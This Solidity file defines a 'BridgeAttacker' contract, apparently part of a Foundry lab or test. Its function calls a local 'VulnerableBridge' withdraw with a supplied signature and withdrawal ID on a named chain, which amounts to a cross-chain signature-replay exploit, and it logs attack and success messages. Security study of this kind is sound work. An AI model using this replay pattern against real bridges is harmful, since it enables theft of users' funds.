// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./VulnerableBridge.sol";
import "forge-std/console.sol";

contract BridgeAttacker {
    address public owner;
    
    constructor() {
        owner = msg.sender;
    }
    
    function exploitCrossChain(
        VulnerableBridge bridge,
        address user,
        uint256 amount,
        bytes32 withdrawalId,
        bytes memory signature,
        string memory chainName
    ) public {
        console.log("[ATTACK] Exploiting on", chainName);
        console.log("[ATTACK] User:", user);
        console.log("[ATTACK] Amount:", amount);
        bridge.withdraw(user, amount, withdrawalId, signature);
        console.log("[SUCCESS] Withdrew", amount, "on", chainName);
    }
    
    receive() external payable {}
}

